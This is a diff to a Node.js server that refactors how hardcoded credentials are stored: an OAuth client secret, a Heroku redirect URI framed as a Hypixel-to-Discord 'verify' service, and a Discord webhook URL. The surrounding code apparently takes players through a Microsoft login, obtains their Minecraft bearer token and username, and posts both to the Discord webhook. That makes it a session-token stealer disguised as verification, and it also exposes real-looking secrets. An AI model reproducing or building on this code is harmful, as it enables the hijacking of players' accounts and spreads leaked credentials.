@@ -1,9 +1,7 @@
-const myconfig = {
-    client_secret: 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj',
-    client_id: '60ed774d-82c5-4864-9038-231bcf8aac1a',
-    redirect_uri: 'https://hypixeltodiscordverify.herokuapp.com/',
-    webhook_url: 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
-}
+const client_secret = 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj'
+client_id = '60ed774d-82c5-4864-9038-231bcf8aac1a'
+const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
+webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
 
 const axios = require('axios')
 const express = require('express')
@@ -36,9 +34,9 @@ async function getAccessToken(code) {
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     const data = {
-        client_id: myconfig.client_id,
-        redirect_uri: myconfig.redirect_uri,
-        client_secret: myconfig.client_secret,
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
@@ -97,7 +95,7 @@ async function getBearerTokenAndUsername(xstsToken, userHash) {
 }
 
 function postToWebhook(username, bearerToken) {
-    const url = myconfig.webhook_url
+    const url = webhook_url
     const headers = {
         'Content-Type': 'application/json',
     }
